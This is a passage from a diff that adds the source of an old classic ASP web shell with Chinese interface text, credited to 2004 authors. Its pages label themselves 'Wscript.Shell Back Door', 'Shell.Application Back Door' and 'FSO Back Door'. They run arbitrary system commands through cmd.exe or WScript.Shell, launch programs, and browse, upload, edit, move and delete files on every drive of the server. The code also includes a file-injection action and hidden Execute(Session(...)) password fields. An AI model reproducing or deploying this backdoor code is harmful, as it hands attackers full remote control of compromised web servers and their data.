+Response.Write "end sub" &amp; vbNewLine
+Response.Write "sub echo(str)" &amp; vbNewLine
+Response.Write "response.write(str)" &amp; vbNewLine
+Response.Write "end sub&lt;/textarea>" &amp; vbNewLine
+Response.Write "&lt;textarea name=""fileContent"" cols=""80"" rows=""10"" id=""fileContent"">fileContent&lt;/textarea> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit3"" value=""提 交"" onClick=""this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""reset"" name=""Submit32"" value=""重 置"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit4"" value=""提 示"" onClick=""alert('上面的文本框用来放要执行的代码\n下面的文本框用来传递其它数据\n下面的文本框的名字是fileContent');""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""right"" class=""td"">Powered By &lt;a href=""javascript:;"" title=""QQ:26696782"">Marcos&lt;/a> 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form>" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; "" &amp; vbNewLine
+Response.Write "- 网页代码常用加解密&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""250"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;textarea cols=80 name=Word onChange=SetWords(this) rows=6>&lt;/textarea>" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input name=encode onClick=SetNewWords1(this.form) type=button value=""Escape加密"">" &amp; vbNewLine
+Response.Write "&lt;INPUT name=uncode onclick=SetNewWords(this.form) type=button value=""Escape解密"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""Encode加密"" onclick=""this.form.NewWords.value=screncode(this.form.Word.value,'JS')"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""Encode解密"" onclick=""this.form.NewWords.value=strdec(this.form.Word.value)"">" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;textarea cols=80 name=NewWords rows=6>&lt;/textarea>" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""right"" class=""td"">Powered By &lt;a href=""javascript:;"" title=""QQ:26696782"">Marcos&lt;/a> 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	sub pageCmdShell()
+		isIn(2)
+		dim cmdStr,cmdPath,cmdResult
+		cmdStr=request("cmdStr")
+		cmdPath=request("cmdPath")
+		
+		showTitle("Shell操作")
+		
+		if cmdPath="" then
+			cmdPath="cmd.exe"
+		end if
+		if cmdStr&lt;>"" then
+			if instr(lcase(cmdPath),lcase("cmd.exe"))>0 or instr(lcase(cmdPath),lcase(myCmdDotExeFile))>0 then
+				cmdResult=doCmdRun(cmdPath&amp;" /c "&amp;cmdStr)
+			 else
+		 		if lcase(cmdPath)=lcase("wscriptShell") then
+					cmdResult=doCmdRun(cmdStr)
+				 else
+					cmdResult=doCmdRun(cmdPath&amp;" "&amp;cmdStr)
+				end if
+			end if
+		end if
+		
+		echo "&lt;body onload=""document.forms[0].cmdStr.focus();"">"
+Response.Write "" &amp; vbNewLine
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=cmdShell"" method=""post"" onSubmit=""this.Submit.disabled=true"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; "" &amp; vbNewLine
+Response.Write "- Wscript.Shell Back Door&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""center"" class=""td""> 路径:" &amp; vbNewLine
+Response.Write "&lt;input name=""cmdPath"" type=""text"" id=""cmdPath"" value=""" &amp; cmdPath &amp; """ size=""50"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""使用wscript.shell"" onClick=""this.form.cmdPath.value='wscriptShell';""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""center"" class=""td"">命令/参数:" &amp; vbNewLine
+Response.Write "&lt;input name=""cmdStr"" type=""text"" id=""cmdStr"" value=""" &amp; server.htmlEncode(cmdStr) &amp; """ size=""60"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit"" value=""运 行"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit3"" value=""注"" onClick=""alert('请只在这里执行单步程序\n(程序执行开始到结束不需要人工干预)\n不然本程序会无法正常工作,\n并且在服务器生成一个不可结束的进程.');""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""center"" class=""td"">" &amp; vbNewLine
+Response.Write "&lt;textarea name=""cmdResult"" cols=""90"" rows=""25"" id=""cmdResult"">" &amp; server.htmlEncode(cmdResult) &amp; "&lt;/textarea>" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=""right"" class=""td"">Powered By &lt;a href=""javascript:;"" title=""QQ:26696782"">Marcos&lt;/a> 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+		echo "&lt;/body>"
+		showExecuteTime()
+	end sub
+	function doCmdRun(cmdStr)
+		on error resume next
+		doCmdRun=ws.exec(cmdStr).stdOut.readAll()
+		if err then
+			echo err.description&amp;"&lt;br>"
+			err.clear
+			ws.run cmdStr&amp;" > "&amp;server.mapPath(".")&amp;"\001.tmp",0,true
+			doCmdRun=fso.openTextFile(server.mapPath(".")&amp;"\001.tmp")
+			if err then
+				echo err.description&amp;"&lt;br>"
+				doCmdRun=streamReadFromFile(server.mapPath(".")&amp;"\001.tmp","gb2312")
+			end if
+		end if
+	end function
+	sub pageApp()
+		isIn(2)
+		dim theAct,dirToView,dirCopyTo,dirCopyFrom,dirMoveTo,dirMoveFrom,appExePath,appExeFile
+		theAct=request("theAct")
+		dirToView=request("dirToView")
+		dirCopyTo=request("dirCopyTo")
+		dirCopyFrom=request("dirCopyFrom")
+		dirMoveTo=request("dirMoveTo")
+		dirMoveFrom=request("dirMoveFrom")
+		appExePath=request("appExePath")
+		appExeFile=request("appExeFile")
+		
+		showTitle("application操作页面")
+		
+		select case theAct
+			case "dirView"
+				viewDir(dirToView)
+			case "dirCopy"
+				dirOperate dirCopyFrom,dirCopyTo,"copy"
+			case "dirMove"
+				dirOperate dirMoveFrom,dirMoveTo,"move"
+			case "appExe"
+				exeApp appExePath,appExeFile
+		end select
+Response.Write "&lt;table width=760 border=0 align=""center"" cellpadding=0 cellspacing=0 class=""td"">" &amp; vbNewLine
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+Response.Write "&lt;td height=""25"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; " - Shell.Application" &amp; vbNewLine
+Response.Write "Back Door&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+Response.Write "&lt;td align=center class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=app&amp;theAct=dirView"" onsubmit=""this.Submit.disabled=true;"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""70"" align=center>" &amp; vbNewLine
+Response.Write "&lt;input name=dirToView type=text id=""dirToView"" value=""" &amp; dirToView &amp; """ size=""50"">" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit"" value=""输入要浏览的目录,最后要加\"">&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=app&amp;theAct=dirCopy"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""70"" align=center> 把文件(夹)" &amp; vbNewLine
+Response.Write "&lt;input name=dirCopyFrom type=text id=""dirCopyFrom"" value=""" &amp; dirCopyFrom &amp; """ size=""39"" onsubmit=""this.Submit2.disabled=true;"">" &amp; vbNewLine
+Response.Write "复制到" &amp; vbNewLine
+Response.Write "&lt;input name=dirCopyTo type=text id=""dirCopyTo"" value=""" &amp; dirCopyTo &amp; """ size=""39"">" &amp; vbNewLine
+Response.Write "下&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit2"" value=""执行复制(最后不要加\)""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=app&amp;theAct=dirMove"" onsubmit=""this.Submit3.disabled=true;"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""70"" align=center>把文件(夹)" &amp; vbNewLine
+Response.Write "&lt;input name=dirMoveFrom type=text id=""dirMoveFrom"" value=""" &amp; dirMoveFrom &amp; """ size=""39"">" &amp; vbNewLine
+Response.Write "移动到" &amp; vbNewLine
+Response.Write "&lt;input name=dirMoveTo type=text id=""dirMoveTo"" value=""" &amp; dirMoveTo &amp; """ size=""39"">" &amp; vbNewLine
+Response.Write "下&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit3"" value=""执行移动(最后不要加\)""> &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=app&amp;theAct=appExe"" onsubmit=""this.Submit4.disabled=true;"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "&lt;td height=""70"" align=center> 路径：" &amp; vbNewLine
+Response.Write "&lt;input name=appExePath type=text id=""appExePath"" value=""" &amp; appExePath &amp; """ size=""50"" >" &amp; vbNewLine
+Response.Write "程序：" &amp; vbNewLine
+Response.Write "&lt;input name=appExeFile type=text id=""appExeFile"" value=""" &amp; appExeFile &amp; """ >" &amp; vbNewLine
+Response.Write "&lt;br>" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit4"" value=""在后台运行程序(不可以加参数)"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td align=center class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr height=18>" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" align=right>Powered By Allen &amp;amp; LCX 2004.11&amp;nbsp; &lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;div id=""loaded"" style=""display:none;"">" &amp; vbNewLine
+Response.Write "&lt;iframe id=""fileEditor"" frameborder=""0"" scrolling=""no"" valign=""top"" width=""100%"" height=""475"">&lt;/iframe>" &amp; vbNewLine
+Response.Write "&lt;/div>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	
+	sub viewDir(dirToView)
+		dim sa,co,fod
+		if mid(dirToView,2,1)&lt;>":" then
+			onErr("请填写真实存在的绝对路径!")
+		end if
+		set sa=server.createObject(shellStr&amp;"."&amp;applicationStr)
+		set fod=sa.namespace(dirToView)
+		echo "&lt;table align=center width=760 border=1>"
+		on error resume next
+		if getParentFolder(dirToView)&lt;>"" then
+			echo "&lt;tr height=22 class=""td"">&lt;td colspan=2>&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=app&amp;theAct=dirView&amp;dirToView="&amp;encodeForUrl(getParentFolder(dirToView),false)&amp;""">↑回到上级&lt;/a>&lt;/td>&lt;/tr>"
+		end if
+		for each co in fod.items
+			if co.isFolder then
+				echo "&lt;tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''"">&lt;td>&amp;nbsp;&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=app&amp;theAct=dirView&amp;dirToView="&amp;encodeForUrl(co.path,false)&amp;""">"&amp;co.path&amp;"&lt;/a>&lt;/td>&lt;td align=right>"&amp;getTheSize(co.size)&amp;"&amp;nbsp;&lt;/td>&lt;/tr>"
+			 else
+				echo "&lt;tr height=22 onmouseover=""this.className='td';"" onMouseOut=""this.className=''"">&lt;td>&amp;nbsp;&lt;a href=""javascript:;"" onclick=""stream_downIt('"&amp;encodeForUrl(co.path, False)&amp;"');"">"&amp;co.path&amp;"&lt;/a>&lt;/td>&lt;td align=right>"&amp;getTheSize(co.size)&amp;"&amp;nbsp;&lt;/td>&lt;/tr>"
+			end if
+		next
+		if err then
+			err.clear
+			onErr "路径未找到!"
+		end if
+		echo "&lt;/table>&lt;br>"
+		set sa=nothing
+		set fod=nothing
+	end sub
+		
+	sub dirOperate(dirFrom,dirTo,theAct)
+		dim i,sa,fod1,fod2,path,path2,foditem
+		if dirFrom="" or dirTo="" then
+			onErr("请完整填写各项!")
+		end if
+		if mid(dirFrom,2,1)&lt;>":" or mid(dirTo,2,1)&lt;>":" then
+			onErr("请填写真实存在的绝对路径!")
+		end if
+		
+		set sa=server.createobject(shellStr&amp;"."&amp;applicationStr)
+		on error resume next
+		set fod1=sa.namespace(dirTo)
+		chkErr err,err.description&amp;"');history.back('"
+		path2=split(dirFrom,"\")(uBound(split(dirFrom,"\")))
+		path=left(dirFrom,len(dirFrom)-len(path2)-1)
+		
+		if len(path)=2 then
+			path=path&amp;"\"
+		end if
+		
+		set fod2=sa.namespace(path)
+		set foditem=fod2.parsename(path2)
+		chkErr err,err.description&amp;"');history.back('"
+		
+		if theAct="copy" then
+			fod1.copyHere foditem
+			chkErr err,err.description&amp;"');history.back('"
+		end if
+		
+		if theAct="move" then
+			fod1.moveHere foditem
+			chkErr err,err.description&amp;"');history.back('"
+		end if
+		
+		echo "&lt;center>命令成功完成!&lt;/center>&lt;br>"
+		
+		set sa=nothing
+		set fod1=nothing
+		set fod2=nothing
+		set foditem=nothing
+	end sub
+	sub exeApp(appExePath,appExeFile)
+		dim sa
+		set sa=server.createObject(shellStr&amp;"."&amp;applicationStr)
+		on error resume next
+		sa.namespace(appExePath).items.item(appExeFile).invokeverb
+		chkErr err,err.description&amp;"');history.back('"
+		echo "&lt;center>命令成功完成!&lt;/center>&lt;br>"
+		set sa=nothing
+	end sub
+	sub pageFso()
+		dim key,list,path,theAct,toPath,thePath,driveStr,fileName,fileContent
+		isIn(2)
+		key=request("key")
+		path=request("path")
+		theAct=request("theAct")
+		toPath=request("toPath")
+		thePath=request("thePath")
+		fileName=request("fileName")
+		fileContent=request("fileContent")
+		
+		if thePath="" then
+			thePath=server.mapPath(".")
+		end if
+		
+		if path="" then
+			path=thePath
+		end if
+		
+		showTitle("FSO操作页面")
+		
+		select case theAct
+			case "inject"
+				fsoInject(thePath)
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "edit"
+				fsoEditFile(thePath)
+				response.end
+			case "save"
+				fsoSaveToFile thePath,fileContent
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "delFile"
+				fsoDelFile(thePath)
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "delFolder"
+				fsoDelFolder(thePath)
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "saveAs"
+				fsoSaveAs thePath,toPath
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "createFile"
+				if not fso.fileExists(thePath&amp;"\"&amp;request("theName")) then
+					fso.createTextFile thePath&amp;"\"&amp;request("theName")
+					chkErr err,err.description
+				end if
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "createFolder"
+				if not fso.folderExists(thePath&amp;"\"&amp;request("theName")) then
+					fso.createFolder thePath&amp;"\"&amp;request("theName")
+					chkErr err,err.description
+				end if
+				echo "&lt;script language=""javascript"">top.location.reload();&lt;/script>"
+				response.end
+			case "searchFolder"
+				set path=fso.getFolder(path)
+				searchFolder path,key
+				response.end
+			case "upload"
+				streamUpload thePath,fileName
+				echo "&lt;script language=""javascript"">location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath="&amp;encodeForUrl(thePath,true)&amp;"';&lt;/script>"
+		end select
+		for each list in fso.drives
+			driveStr=driveStr&amp;"&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath="&amp;list.driveLetter&amp;":\"">"&amp;list.driveLetter&amp;"盘:&lt;/a> "
+		next
+Response.Write "&lt;table width=""760"" border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""4"" class=""td"">&amp;nbsp;" &amp; request.serverVariables("server_name") &amp; " - FSO Back Door&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" onSubmit=""this.Submit3.disabled=true;"" action=""?pageName=fso"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""td"">&amp;nbsp;切换盘符: " &amp; driveStr &amp; " 本机局域网地址：" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+			on error resume next
+        	echo "\\"&amp;net.computerName&amp;"\"&amp;net.userName
+			if err then
+				err.clear
+				echo err.description
+			end if
+		
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""td"">&amp;nbsp;PATH:" &amp; vbNewLine
+Response.Write "&lt;input name=""thePath"" type=""text"" id=""thePath"" value=""" &amp; thePath &amp; """ size=""60"">" &amp; vbNewLine
+Response.Write "&lt;input type=""submit"" name=""Submit3"" value=""查 看"" onclick=""location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath='+this.form.thePath.value;this.disabled=true;"">" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=fso&amp;theAct=searchFolder"" onsubmit=""if(this.key.value==''){alert('请填写关键字!');return false;}else{this.Submit5.disabled=true;}"" target=""_blank"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""td"">&amp;nbsp;在" &amp; vbNewLine
+Response.Write "&lt;input name=""path"" type=""text"" id=""path"" value=""" &amp; path &amp; """>" &amp; vbNewLine
+Response.Write "中查找" &amp; vbNewLine
+Response.Write "&lt;input name=""key"" type=""text"" id=""key"" value=""" &amp; key &amp; """> &lt;input type=""submit"" name=""Submit5"" value=""用于查找存在的木马"">&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""td"">&amp;nbsp; &lt;input name=""theName"" type=""text"" id=""theName2"" size=""39"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit2"" value=""新建文件"" onClick=""if(this.form.theName.value==''){alert('请填写文件名!');this.form.theName.focus();}else{fileEditor.location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath=" &amp; encodeForUrl(thePath,true) &amp; "&amp;theAct=createFile&amp;theName='+this.form.theName.value;this.disabled=true;}"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit4"" value=""新建目录"" onClick=""if(this.form.theName.value==''){alert('请填写文件夹名!');this.form.theName.focus();}else{fileEditor.location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;thePath=" &amp; encodeForUrl(thePath,true) &amp; "&amp;theAct=createFolder&amp;theName='+this.form.theName.value;this.disabled=true;}"">" &amp; vbNewLine
+Response.Write "&lt;span class=""warningColor"">〖新建文件和新建目录不能同名〗&lt;/span>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" enctype=""multipart/form-data"" action=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=upload&amp;thePath=" &amp; encodeForUrl(thePath,false) &amp; """ onsubmit=""return upload_canSubmit(this);"">" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""td"">&amp;nbsp; &lt;input name=""file"" type=""file"" size=""25"">" &amp; vbNewLine
+Response.Write "保存为" &amp; vbNewLine
+Response.Write "&lt;input name=""fileName"" type=""text"" value=""" &amp; thePath &amp; """ size=""35"">" &amp; vbNewLine
+Response.Write "&lt;input name=""Submit"" type=""submit"" id=""Submit"" value=""上 传"" onClick=""this.form.action+='&amp;theFile='+this.form.file.value+'&amp;overWrite='+this.form.writeMode.checked;"">" &amp; vbNewLine
+Response.Write "&lt;input type=""checkbox"" name=""writeMode"" value=""True"">覆盖模式" &amp; vbNewLine
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/form>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td width=""30%"" rowspan=""2"" valign=""top"" class=""td"">" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+call fsoGetFolderList(thePath,true)
+Response.Write "&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td width=""555"" colspan=""3"" valign=""top"">" &amp; vbNewLine
+Response.Write "" &amp; vbNewLine
+call fsoGetFolderList(thePath,false)
+Response.Write "&lt;div id=""loaded"" style=""display:none;"">" &amp; vbNewLine
+Response.Write "&lt;iframe id=""fileEditor"" frameborder=""0"" scrolling=""no"" valign=""top"" width=""100%"" height=""475"">&lt;/iframe>" &amp; vbNewLine
+Response.Write "&lt;/div>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td colspan=""4"" class=""trHead"">&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr align=""right"">" &amp; vbNewLine
+Response.Write "&lt;td height=""22"" colspan=""4"" class=""td"">Powered By Allen &amp;amp; LCX 2004.11&amp;nbsp;&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;/table>" &amp; vbNewLine
+Response.Write "&lt;a name=""foot"">&lt;/a>" &amp; vbNewLine
+		showExecuteTime()
+	end sub
+	
+	sub fsoEditFile(thePath)
+		dim theFile
+		on error resume next
+		set theFile=fso.openTextFile(thePath,1,false)
+		if err then
+			echo "错误:"&amp;err.description
+			err.clear
+			response.end
+		end if
+Response.Write "&lt;table border=""0"" align=""center"" cellpadding=""0"" cellspacing=""0"">" &amp; vbNewLine
+Response.Write "&lt;form method=""post"" action=""?pageName=fso&amp;theAct=save"" onsubmit=""if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}"">" &amp; vbNewLine
+		echo "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(""{$ThePass}""))>"
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td>&lt;input name=""thePath"" type=""text"" id=""thePath3"" value=""" &amp; thePath &amp; """ size=""50"">" &amp; vbNewLine
+Response.Write "&lt;input type=""button"" name=""Submit62"" value=""查 看"" onclick=""location.href='?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso&amp;theAct=edit&amp;thePath='+this.form.thePath.value;this.disabled=true;"">&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
+Response.Write "&lt;td>&lt;textarea name=""fileContent"" cols=""70"" rows=""25"" id=""fileContent"">" &amp; server.htmlEncode(theFile.readAll()) &amp; "&lt;/textarea>&lt;/td>" &amp; vbNewLine
+Response.Write "&lt;/tr>" &amp; vbNewLine
+Response.Write "&lt;tr>" &amp; vbNewLine
